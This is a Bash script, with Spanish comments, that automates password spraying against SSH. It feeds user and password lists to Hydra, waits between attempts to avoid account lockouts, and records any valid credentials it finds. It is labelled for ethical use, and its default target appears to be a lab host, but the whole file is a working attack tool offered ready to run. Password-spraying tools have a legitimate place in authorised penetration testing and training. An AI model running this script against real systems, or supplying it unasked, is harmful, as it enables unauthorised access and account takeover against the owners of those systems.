#!/bin/bash
# password_spray.sh
# Script automatizado para password spraying ético

USERS="${1:-/tmp/ssh_users.txt}"
PASSWORDS="${2:-/tmp/common_passwords.txt}"
TARGET="${3:-ssh://ssh-target:2222}"
DELAY="${4:-60}"  # Segundos entre intentos

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${CYAN}============================================${NC}"
echo -e "${CYAN}   Password Spraying Tool (Ethical Use)${NC}"
echo -e "${CYAN}============================================${NC}"
echo ""

# Validaciones
if [ ! -f "$USERS" ]; then
    echo -e "${RED}[!] Error: Archivo de usuarios no encontrado: $USERS${NC}"
    exit 1
fi

if [ ! -f "$PASSWORDS" ]; then
    echo -e "${RED}[!] Error: Archivo de passwords no encontrado: $PASSWORDS${NC}"
    exit 1
fi

# Información
USER_COUNT=$(wc -l < "$USERS")
PASS_COUNT=$(wc -l < "$PASSWORDS")
TOTAL_ATTEMPTS=$((USER_COUNT * PASS_COUNT))
ESTIMATED_TIME=$((TOTAL_ATTEMPTS * DELAY / 60))

echo -e "${YELLOW}[*] Configuración:${NC}"
echo "    Target:     $TARGET"
echo "    Usuarios:   $USER_COUNT"
echo "    Passwords:  $PASS_COUNT"
echo "    Delay:      ${DELAY}s entre passwords"
echo "    Total intentos: $TOTAL_ATTEMPTS"
echo "    Tiempo estimado: ~${ESTIMATED_TIME} minutos"
echo ""

read -p "¿Continuar? (y/n): " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*] Abortado por el usuario${NC}"
    exit 0
fi

echo ""
echo -e "${CYAN}[*] Iniciando password spraying...${NC}"
echo ""

# Archivo de resultados
RESULTS_FILE="password_spray_results_$(date +%Y%m%d_%H%M%S).txt"
echo "Password Spraying Results - $(date)" > "$RESULTS_FILE"
echo "Target: $TARGET" >> "$RESULTS_FILE"
echo "Users tested: $USER_COUNT" >> "$RESULTS_FILE"
echo "Passwords tested: $PASS_COUNT" >> "$RESULTS_FILE"
echo "---" >> "$RESULTS_FILE"

FOUND=0
ATTEMPT=0

while read password; do
    ATTEMPT=$((ATTEMPT + 1))
    echo ""
    echo -e "${YELLOW}[$ATTEMPT/$PASS_COUNT] Probando password: ${NC}\"$password\""
    
    # Ejecutar Hydra
    hydra -L "$USERS" -p "$password" "$TARGET" -t 1 -f -V 2>&1 | tee /tmp/hydra_output.txt
    
    # Verificar si encontró algo
    if grep -q "login:" /tmp/hydra_output.txt; then
        VALID_CRED=$(grep "login:" /tmp/hydra_output.txt | head -1)
        echo -e "${GREEN}[!] CREDENCIAL VÁLIDA ENCONTRADA!${NC}"
        echo -e "${GREEN}    $VALID_CRED${NC}"
        echo "$VALID_CRED" >> "$RESULTS_FILE"
        FOUND=$((FOUND + 1))
    else
        echo -e "${RED}    ✗ Password \"$password\" inválida para todos los usuarios${NC}"
    fi
    
    # Delay solo si no es la última password
    if [ $ATTEMPT -lt $PASS_COUNT ]; then
        echo -e "${CYAN}[*] Esperando ${DELAY}s antes del siguiente intento...${NC}"
        sleep $DELAY
    fi
done < "$PASSWORDS"

# Resumen
echo ""
echo -e "${CYAN}============================================${NC}"
echo -e "${CYAN}           RESUMEN${NC}"
echo -e "${CYAN}============================================${NC}"
echo "Passwords probadas:  $PASS_COUNT"
echo "Usuarios testeados:  $USER_COUNT"
echo "Total intentos:      $TOTAL_ATTEMPTS"
echo -e "${GREEN}Credenciales válidas: $FOUND${NC}"
echo ""
echo "Resultados guardados en: $RESULTS_FILE"
echo -e "${CYAN}============================================${NC}"

if [ $FOUND -gt 0 ]; then
    echo ""
    echo -e "${GREEN}[+] Credenciales válidas:${NC}"
    grep "login:" "$RESULTS_FILE"
fi
